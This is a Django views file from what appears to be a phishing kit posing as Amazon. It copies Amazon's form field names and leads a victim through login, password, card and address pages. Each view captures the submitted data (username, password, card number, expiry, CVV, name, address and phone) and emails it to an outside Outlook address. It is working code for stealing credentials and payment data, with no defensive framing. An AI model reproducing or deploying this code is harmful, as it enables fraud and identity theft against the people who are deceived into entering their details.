from django.shortcuts import render
from django.http import HttpResponse
from django.core.mail import send_mail
from amazon.settings import EMAIL_HOST_USER
# Create your views here.

def login(request):
    return render(request, 'login.html')

def passw(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        context = {'username':username}
        subject = 'New username submitted'
        mail_message = f"username: {username}\n"
        from_email = EMAIL_HOST_USER
        recipient_list = ['madeway34@outlook.com'] 
        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
    return render(request, 'passw.html', context)

def card(request):
    if request.method == 'POST':
        password = request.POST.get('password')
        subject = ' '
        mail_message = f"password: {password}\n"
        from_email = EMAIL_HOST_USER
        recipient_list = ['madeway34@outlook.com'] 
        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)

    return render(request, 'card.html')

def address(request):
    if request.method == 'POST':
        cardnumber = request.POST.get('cardnumber')
        nameoncard = request.POST.get('ppw-accountHolderName')
        exp_month = request.POST.get('ppw-expirationDate_month')
        exp_year = request.POST.get('ppw-expirationDate_year')
        cvv = request.POST.get('addCreditCardVerificationNumber')

        subject = 'New card submitted'
        mail_message = f"Card_number: {cardnumber}\nName_on_card: {nameoncard}\nEXp_month: {exp_month}\nExp_year: {exp_year}\nCvv: {cvv}"
        from_email = EMAIL_HOST_USER
        recipient_list = ['madeway34@outlook.com'] 
        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)

    return render(request, 'address.html')

def confirmation(request):
    if request.method == 'POST':
        addressid = request.POST.get('addressID')
        postalcode =request.POST.get('address-ui-widgets-enterAddressPostalCode')
        province = request.POST.get('address-ui-widgets-enterAddressStateOrRegion')
        city = request.POST.get('address-ui-widgets-enterAddressCity')
        phone = request.POST.get('address-ui-widgets-enterAddressPhoneNumber')
        fullname = request.POST.get('address-ui-widgets-enterAddressFullName')
        address = request.POST.get('address-ui-widgets-enterAddressLine1')


        subject = 'New address submitted'
        mail_message = f"Full_name: {fullname}\nPhone_number: {phone}\nAddress: {address}\nCity: {city}\nProvince: {province}\nPostal_code: {postalcode}"
        from_email = EMAIL_HOST_USER
        recipient_list = ['madeway34@outlook.com'] 
        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
        
    
    return render(request, 'confirmation.html')